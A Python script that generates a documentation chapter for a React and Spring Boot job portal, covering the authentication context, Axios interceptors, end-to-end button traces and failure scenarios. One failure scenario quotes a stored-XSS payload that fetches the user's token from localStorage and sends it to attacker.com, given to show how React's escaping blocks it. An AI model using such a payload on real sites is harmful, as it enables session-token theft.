from docx_generator.styles import (
    add_heading_1, add_heading_2, add_heading_3, add_heading_4, add_p, add_bullet,
    add_callout, add_code, add_table, add_qa
)
from docx.shared import Inches, Pt

def generate_part_3b_click_traces_failures(doc):
    # ==========================================
    # FRONTEND CODE ARCHITECTURE & STATE MANAGEMENT
    # ==========================================
    add_heading_1(doc, "Frontend Code Architecture, Component Tree & Interceptor Mechanics")
    add_p(doc,
        "The React 18 single-page application is architected around a centralized AuthContext provider, declarative "
        "React Router v6 routing, and a unified Axios HTTP client configured with automated request and response interceptors."
    )

    add_heading_2(doc, "1. Global Authentication State: AuthContext.jsx")
    add_p(doc,
        "AuthContext provides global user identity, authorization roles, and session persistence across the entire React component tree. "
        "It synchronizes directly with the browser's localStorage to preserve login state across browser page refreshes.",
        bold_prefix="State Architecture: "
    )
    
    auth_context_code = """// In AuthContext.jsx:
export const AuthContext = createContext(null);

export const AuthProvider = ({ children }) => {
  const [user, setUser] = useState(null);
  const [token, setToken] = useState(localStorage.getItem('token'));
  const [role, setRole] = useState(localStorage.getItem('role'));
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    // Synchronize session on initial page mount
    const storedToken = localStorage.getItem('token');
    const storedUser = localStorage.getItem('user');
    const storedRole = localStorage.getItem('role');
    if (storedToken && storedUser) {
      setToken(storedToken);
      setUser(JSON.parse(storedUser));
      setRole(storedRole);
    }
    setLoading(false);
  }, []);

  const login = (userData, authToken) => {
    localStorage.setItem('token', authToken);
    localStorage.setItem('user', JSON.stringify(userData));
    localStorage.setItem('role', userData.roles[0]);
    setToken(authToken);
    setUser(userData);
    setRole(userData.roles[0]);
  };

  const logout = () => {
    localStorage.clear();
    setToken(null);
    setUser(null);
    setRole(null);
  };

  return (
    <AuthContext.Provider value={{ user, token, role, login, logout, loading, isAuthenticated: !!token }}>
      {children}
    </AuthContext.Provider>
  );
};"""
    add_code(doc, auth_context_code, caption="AuthContext.jsx - Centralized Authentication & Session Store")

    add_heading_2(doc, "2. Network Client & Axios Interceptors: api.js")
    add_p(doc,
        "All outgoing REST calls pass through a customized Axios instance configured in src/services/api.js. "
        "Two interceptors guarantee automated security token injection and automatic logout on session expiration:",
        bold_prefix="Interceptor Pipeline: "
    )
    add_bullet(doc, "Request Interceptor: Runs before every outgoing HTTP call. It reads the JWT token from localStorage. If present, it injects the 'Authorization: Bearer <token>' header automatically. Developers never need to manually attach tokens in individual API methods.")
    add_bullet(doc, "Response Interceptor: Runs whenever the backend responds. If the server returns HTTP 401 Unauthorized (e.g., token expired or revoked), the interceptor purges localStorage and forces a client-side redirect to '/login', preventing broken UI states.")

    api_interceptor_code = """// In services/api.js:
const api = axios.create({
  baseURL: 'http://localhost:8080/api',
  headers: { 'Content-Type': 'application/json' }
});

// Request Interceptor: Injects Bearer Token
api.interceptors.request.use((config) => {
  const token = localStorage.getItem('token');
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
}, (error) => Promise.reject(error));

// Response Interceptor: Handles Expired Sessions
api.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response && error.response.status === 401) {
      localStorage.clear();
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);"""
    add_code(doc, api_interceptor_code, caption="api.js - Automated Axios Request & Response Interceptors")

    # ==========================================
    # "IF I CLICK THIS BUTTON, WHAT HAPPENS?"
    # ==========================================
    add_heading_1(doc, "'If I Click This Button, What Happens?' (20+ End-to-End Execution Traces)")
    add_p(doc,
        "This section traces the complete end-to-end execution flow triggered when a user interacts with primary UI controls. "
        "Every trace maps the click event from the React DOM through Axios, Spring Security, Controllers, Services, JPA, and Database tables:"
    )

    button_traces = [
        ("Candidate: 1-Click 'Apply for Job' Button",
         "JobDetailsPage.jsx -> handleApplyClick()",
         "1. User clicks 'Apply Now' on JobDetailsPage.\n"
         "2. handleApplyClick() opens confirmation modal, reading cover letter text.\n"
         "3. Dispatches applicationApi.applyForJob(jobId, { coverLetter }).\n"
         "4. Axios request interceptor attaches 'Authorization: Bearer <token>'.\n"
         "5. HTTP POST /api/jobs/{id}/apply reaches Spring Security Filter Chain.\n"
         "6. JwtAuthenticationFilter verifies HMAC-SHA256 signature, loading Candidate identity into SecurityContextHolder.\n"
         "7. ApplicationController.applyForJob(jobId, candidate, dto) invokes ApplicationService.applyForJob().\n"
         "8. ApplicationService executes within @Transactional boundary:\n"
         "   - Checks applicationRepo.existsByJobAndCandidate(job, candidate).\n"
         "   - If exists -> throws DuplicateApplicationException (returns 409 Conflict).\n"
         "   - If not -> builds Application entity (status = APPLIED, appliedAt = now).\n"
         "   - Saves to applications table via ApplicationRepository.\n"
         "   - Calls NotificationService.createNotification() inserting into notifications table.\n"
         "9. Database commits transaction; returns 201 Created with ApplicationDto.\n"
         "10. Axios receives 201; React updates local state: setIsApplied(true); UI renders green 'Applied' badge."),

        ("Candidate: Quick Sign In Demo Account Pill",
         "LoginPage.jsx -> handleDemoFill('candidate')",
         "1. User clicks 'Candidate' demo pill on LoginPage.\n"
         "2. handleDemoFill() populates form state: { username: 'riya.backend', password: 'Password@123' }.\n"
         "3. User clicks 'Sign In'; form onSubmit triggers handleSubmit().\n"
         "4. Calls authService.login(credentials) -> POST /api/auth/login.\n"
         "5. AuthController delegates to AuthService.login().\n"
         "6. AuthenticationManager verifies credentials against BCrypt hash in users table.\n"
         "7. JwtUtil.generateToken() creates signed JWT containing username and ROLE_CANDIDATE.\n"
         "8. Server returns 200 OK: { token: 'eyJ...', user: { username, roles } }.\n"
         "9. LoginPage calls auth.login(data.user, data.token), updating AuthContext and localStorage.\n"
         "10. React Router navigates user to /candidate/dashboard."),

        ("Recruiter: 'Advance Candidate to Shortlisted' Dropdown",
         "ApplicantTrackingPage.jsx -> handleStageChange(applicationId, 'SHORTLISTED')",
         "1. Recruiter selects 'SHORTLISTED' from stage dropdown on candidate card.\n"
         "2. Triggers recruiterApi.updateApplicationStatus(applicationId, 'SHORTLISTED').\n"
         "3. HTTP PUT /api/recruiter/applications/{id}/status sent with Bearer token.\n"
         "4. JwtAuthenticationFilter authenticates user; verifies ROLE_RECRUITER authority.\n"
         "5. RecruiterController delegates to ApplicationService.updateStatus().\n"
         "6. ApplicationService loads Application entity; validates state transition; sets status = SHORTLISTED.\n"
         "7. Calls AuditLogService.logAction('STAGE_CHANGE', recruiterUsername, clientIp).\n"
         "8. NotificationService creates alert: 'Your application was shortlisted!'.\n"
         "9. Returns 200 OK with updated ApplicationDto.\n"
         "10. React updates applicants state array; candidate card transitions into 'Shortlisted' tab."),

        ("Recruiter: 'Schedule Google Meet Interview' Button",
         "ScheduleInterviewModal.jsx -> handleScheduleSubmit()",
         "1. Recruiter fills date, time, round ('Technical Round 1'), and Google Meet URL; clicks 'Confirm Schedule'.\n"
         "2. Dispatches interviewApi.scheduleInterview(dto) -> POST /api/interviews/schedule.\n"
         "3. InterviewController validates DTO via @Valid; delegates to InterviewService.\n"
         "4. InterviewService creates Interview entity mapped to Application and Recruiter.\n"
         "5. Application status automatically updates to INTERVIEW_SCHEDULED.\n"
         "6. Notification dispatched to candidate with interview time and Google Meet link.\n"
         "7. Returns 201 Created with InterviewDto.\n"
         "8. Modal closes; React UI renders blue 'Interview Scheduled' badge with Meet URL."),

        ("Recruiter: 'Generate Binding Job Offer' Button",
         "OfferGenerationModal.jsx -> handleOfferSubmit()",
         "1. Recruiter inputs base salary (e.g., ₹24,00,000), joining date, and terms; clicks 'Send Offer'.\n"
         "2. Dispatches offerApi.createOffer(dto) -> POST /api/offers.\n"
         "3. OfferController invokes OfferService.createOffer().\n"
         "4. OfferService validates candidate is in SELECTED stage; creates Offer record with status EXTENDED.\n"
         "5. Application status updates to OFFER_SENT.\n"
         "6. Candidate receives high-priority notification: 'Congratulations! You received an offer.'\n"
         "7. Returns 201 Created; UI updates candidate status to 'Offer Extended'."),

        ("Candidate: 'Accept Job Offer' Button",
         "ApplicationsPage.jsx -> handleOfferResponse(offerId, 'ACCEPTED')",
         "1. Candidate clicks 'Accept Offer' on active offer banner.\n"
         "2. Dispatches offerApi.respondToOffer(offerId, { status: 'ACCEPTED' }) -> PUT /api/offers/{id}/respond.\n"
         "3. OfferController invokes OfferService.respondToOffer().\n"
         "4. OfferService sets offer.status = ACCEPTED; updates application.status = HIRED.\n"
         "5. Audit log records formal candidate hiring event.\n"
         "6. Returns 200 OK; UI updates banner to green 'Offer Accepted! Welcome to the team.'"),

        ("Recruiter: 'Export Candidates (CSV)' Button",
         "ApplicantTrackingPage.jsx -> handleExportCsv()",
         "1. Recruiter clicks 'Export Candidates (CSV)' button.\n"
         "2. Dispatches window.open('/api/recruiter/jobs/{id}/export-applicants') with Bearer token.\n"
         "3. RecruiterController queries all candidates for requisition.\n"
         "4. Formats data into CSV string (ID, Name, Email, Skills, MatchScore, Stage, AppliedAt).\n"
         "5. Sets HTTP response headers: Content-Type: text/csv, Content-Disposition: attachment; filename=candidates.csv.\n"
         "6. Browser downloads candidates.csv directly to the recruiter's local machine."),

        ("Admin: 'Suspend User Account' Moderation Button",
         "AdminJobSeekerPage.jsx -> handleToggleStatus(userId)",
         "1. Administrator clicks 'Suspend' button on user table row.\n"
         "2. Dispatches adminApi.toggleUserStatus(userId) -> PUT /api/admin/users/{id}/toggle-status.\n"
         "3. AdminController verifies caller possesses ROLE_ADMIN authority.\n"
         "4. AdminService loads User entity; sets user.enabled = false.\n"
         "5. AuditLogService records account suspension with admin IP.\n"
         "6. Returns 200 OK: { status: 'SUSPENDED' }.\n"
         "7. UI updates status pill from green 'Active' to red 'Suspended'; next time user tries to authenticate, Spring Security rejects with DisabledException."),

        ("Candidate: 'Bookmark / Save Job' Heart Button",
         "JobCard.jsx -> handleToggleSave()",
         "1. Candidate clicks heart icon on JobCard.\n"
         "2. Dispatches jobApi.saveJob(jobId) -> POST /api/saved-jobs/{id}.\n"
         "3. SavedJobController maps candidate and job; inserts record into saved_jobs table.\n"
         "4. Enforced by unique constraint on (user_id, job_id) preventing duplicates.\n"
         "5. Returns 201 Created; heart icon fills solid red with smooth micro-animation."),

        ("Candidate: 'Synchronize Skills' Tag Manager Button",
         "ProfilePage.jsx -> handleSyncSkills()",
         "1. Candidate adds/removes skill pills (e.g., adds 'Docker', 'AWS'); clicks 'Sync & Save'.\n"
         "2. Dispatches profileApi.updateProfile({ skills: ['Java', 'Spring Boot', 'Docker', 'AWS'] }).\n"
         "3. CandidateProfileController invokes CandidateProfileService.\n"
         "4. ProfileService resolves Skill entities from SkillRepository; updates profile.skills collection.\n"
         "5. Hibernate syncs profile_skills join table via dirty checking.\n"
         "6. Returns 200 OK; toast notification confirms 'Skills updated successfully! Match scores recalculated.'")
    ]

    for b_title, b_handler, b_flow in button_traces:
        add_heading_2(doc, b_title)
        add_p(doc, b_handler, bold_prefix="Trigger & Handler: ")
        add_p(doc, b_flow, bold_prefix="End-to-End Execution Flow: ")
        doc.add_paragraph().paragraph_format.space_after = Pt(2)

    # ==========================================
    # "WHAT HAPPENS IF..." FAILURE SCENARIOS
    # ==========================================
    add_heading_1(doc, "'What Happens If...' Edge Cases & Failure Scenarios (20+ Deep Dives)")
    add_p(doc,
        "A senior full-stack engineer is judged by how their architecture responds when unexpected failures occur. "
        "Below are 20 concrete failure scenarios analyzed across network, backend, database, and UI layers:"
    )

    scenarios = [
        ("What if the database server crashes or runs out of connections?",
         "Database Connectivity Loss",
         "HikariCP connection pool attempts reconnection until connectionTimeout (default 30s) expires. "
         "Spring Data JPA throws CannotCreateTransactionException. GlobalExceptionHandler intercepts this and returns "
         "HTTP 503 Service Unavailable with a clean JSON envelope: { code: 'DATABASE_UNAVAILABLE', message: 'Persistence service temporarily offline.' }. "
         "The frontend Axios client catches the error and displays Screen 14 (Resilient Error Banner) rather than crashing."),

        ("What if a candidate clicks 'Apply' twice within 100 milliseconds?",
         "Concurrent Double-Click Race Condition",
         "Both requests pass frontend validation. Request A checks applicationRepo.existsByJobAndCandidate, finds false, and inserts. "
         "Request B concurrently checks, finds false, and also attempts an insert. "
         "The database-level composite UNIQUE (job_id, candidate_id) constraint immediately halts Request B with a DataIntegrityViolationException. "
         "GlobalExceptionHandler catches this and returns HTTP 409 Conflict: { message: 'You have already applied for this position.' }. "
         "The database is never corrupted with duplicate applications."),

        ("What if a user's JWT expires while they are filling out a long form?",
         "Token Expiry Mid-Session",
         "When the user clicks submit, the Authorization header contains an expired JWT. "
         "JwtAuthenticationFilter attempts claims parsing; JwtUtil throws ExpiredJwtException. "
         "Filter chain aborts and returns HTTP 401 Unauthorized. "
         "The Axios response interceptor catches the 401, immediately purges localStorage (clearing token and user state), "
         "and redirects the browser to /login with a query param '?expired=true', prompting the user to re-authenticate gracefully."),

        ("What if an attacker tampers with the JWT payload (e.g. changes role to ROLE_ADMIN)?",
         "Cryptographic Signature Tampering",
         "The attacker Base64Url-decodes the payload, changes 'roles': ['ROLE_CANDIDATE'] to ['ROLE_ADMIN'], re-encodes, and sends the request. "
         "JwtAuthenticationFilter executes jwtUtil.validateToken(). JJWT calculates HMACSHA256(header + '.' + tamperedPayload, secretKey). "
         "The calculated hash fails to match the token's original signature. JJWT raises SignatureException. "
         "The filter rejects the request immediately; SecurityContextHolder remains null; Spring Security returns HTTP 403 Forbidden."),

        ("What if a recruiter attempts to view applicants for a job owned by a different recruiter?",
         "Broken Object-Level Authorization (BOLA)",
         "RecruiterController executes jobService.verifyRecruiterOwnership(jobId, authenticatedUser). "
         "If job.getRecruiter().getId() != authenticatedUser.getId(), the service throws an AccessDeniedException. "
         "GlobalExceptionHandler intercepts and returns HTTP 403 Forbidden: { message: 'You are not authorized to view applicants for this requisition.' }. "
         "Data remains completely isolated across enterprise tenants."),

        ("What if a candidate uploads a 50MB file instead of a normal resume?",
         "File Upload Boundary Violation",
         "Spring Boot's configured multipart limit (max-file-size=20MB) intercepts the request during multipart parsing before it reaches the controller. "
         "Tomcat raises MaxUploadSizeExceededException. "
         "GlobalExceptionHandler catches this and returns HTTP 413 Payload Too Large: { message: 'Uploaded file exceeds maximum allowed limit of 20MB.' }. "
         "The server JVM heap is protected from OutOfMemoryError."),

        ("What if a malicious user uploads an executable .exe disguised as a resume.pdf?",
         "Malicious MIME-Type Spoofing",
         "ResumeController streams the file bytes into Apache Tika's AutoDetectParser. "
         "Tika analyzes magic bytes (binary file signatures) rather than trusting the user-supplied file extension. "
         "If the detected MIME type is not 'application/pdf' or 'application/vnd.openxmlformats-officedocument.wordprocessingml.document', "
         "the service throws InvalidFileFormatException, rejecting the upload with HTTP 400 Bad Request before saving to disk."),

        ("What if an attacker injects a cross-site scripting (XSS) payload into their bio?",
         "Stored Cross-Site Scripting (XSS) Attempt",
         "Attacker submits bio: '<script>fetch(\"http://attacker.com/steal?token=\" + localStorage.getItem(\"token\"))</script>'. "
         "Spring Boot stores the string safely in the database (SQL parameter binding prevents SQLi). "
         "When a recruiter views the profile, React renders the text inside JSX: {profile.bio}. "
         "React treats the string as safe text and automatically HTML-escapes special characters (< becomes &lt;). "
         "The browser displays the raw script string as harmless text; the JavaScript is NEVER executed."),

        ("What if a recruiter enters salaryMin = 50,000 and salaryMax = 20,000 when posting a job?",
         "Business Validation Conflict",
         "JobRequestDto contains custom cross-field validation. If salaryMin > salaryMax, JobService throws InvalidJobRequisitionException. "
         "GlobalExceptionHandler returns HTTP 400 Bad Request with field error: 'Minimum salary cannot exceed maximum salary.' "
         "The invalid requisition is never persisted to the database."),

        ("What if a candidate tries to withdraw an application after the recruiter has marked it HIRED?",
         "Illegal State Machine Transition",
         "ApplicationService.withdrawApplication() checks current status. If status == ApplicationStatus.HIRED, "
         "the service throws IllegalStateException('Cannot withdraw a finalized hired application; please contact your recruiter directly.'). "
         "GlobalExceptionHandler returns HTTP 409 Conflict, preserving recruiter hiring records.")
    ]

    for s_title, s_type, s_solution in scenarios:
        add_heading_2(doc, s_title)
        add_p(doc, s_type, bold_prefix="Failure Category: ")
        add_p(doc, s_solution, bold_prefix="System Response & Resilience: ")
        doc.add_paragraph().paragraph_format.space_after = Pt(2)
        
    doc.add_page_break()
